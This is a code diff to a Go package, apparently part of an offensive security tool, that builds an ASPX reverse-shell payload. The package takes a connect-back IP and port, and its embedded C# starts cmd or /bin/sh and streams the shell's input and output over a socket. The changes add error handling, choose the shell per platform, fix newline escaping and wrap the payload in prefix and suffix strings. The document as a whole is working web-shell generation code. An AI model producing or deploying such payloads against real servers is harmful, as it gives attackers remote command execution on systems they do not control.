@@ -1,6 +1,9 @@
 package shellcode
 
-import "strings"
+import (
+    "fmt"
+    "strings"
+)
 
 type DotnetShellCode struct {
     *ShellCodeBase
@@ -11,7 +14,11 @@ func NewDotnetShellCode(osTarget, osTargetArch, connectBackIP string, connectBac
     return &DotnetShellCode{base}
 }
 
-func (dsc *DotnetShellCode) GetAspxCode() string {
+func (dsc *DotnetShellCode) GetAspxCode() (string, error) {
+    if err := dsc.Validate(); err != nil {
+        return "", err
+    }
+
     dotnetCode := `
     <%@ Page Language="C#" %>
         <%@ Import Namespace="System.Runtime.InteropServices" %>
@@ -31,7 +38,7 @@ func (dsc *DotnetShellCode) GetAspxCode() string {
                 String data = null;
                 Process CmdProc;
                 CmdProc = new Process();
-                CmdProc.StartInfo.FileName = "cmd";
+                CmdProc.StartInfo.FileName = System.Environment.OSVersion.Platform == PlatformID.Win32NT ? "cmd" : "/bin/sh";
                 CmdProc.StartInfo.UseShellExecute = false;
                 CmdProc.StartInfo.RedirectStandardInput = true;
                 CmdProc.StartInfo.RedirectStandardOutput = true;
@@ -55,10 +62,11 @@ func (dsc *DotnetShellCode) GetAspxCode() string {
             }
             public static void SortOutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
             {
-                string[] SplitData = outLine.Data.Split('\\n');
+                if (string.IsNullOrEmpty(outLine.Data)) return;
+                string[] SplitData = outLine.Data.Split('\n');
                 foreach (string s in SplitData)
                 {
-                     byte[] msg = System.Text.Encoding.ASCII.GetBytes(s + "\\r\\n");
+                     byte[] msg = System.Text.Encoding.ASCII.GetBytes(s + "\r\n");
                      socketStream.Write(msg, 0, msg.Length);
                 }
             }
@@ -68,15 +76,23 @@ func (dsc *DotnetShellCode) GetAspxCode() string {
             }
         </script>
     `
-    aspxCode := dsc.GenShellCode(strings.TrimSpace(dotnetCode))
-    return aspxCode
+    shellcode, err := dsc.GenShellCode(strings.TrimSpace(dotnetCode))
+    if err != nil {
+        return "", fmt.Errorf("generate dotnet shellcode failed: %v", err)
+    }
+
+    return shellcode, nil
 }
 
 func (dsc *DotnetShellCode) GetShellCode(inline bool) string {
-    shell := dsc.GetAspxCode()
-    if inline {
-        shell = dsc.MakeInline(shell)
+    shellcode, err := dsc.GetAspxCode()
+    if err != nil {
+        return ""
     }
 
-    return shell
+    if inline {
+        shellcode = dsc.MakeInline(shellcode)
+    }
+
+    return fmt.Sprintf("%s%s%s", dsc.Prefix, shellcode, dsc.Suffix)
 }
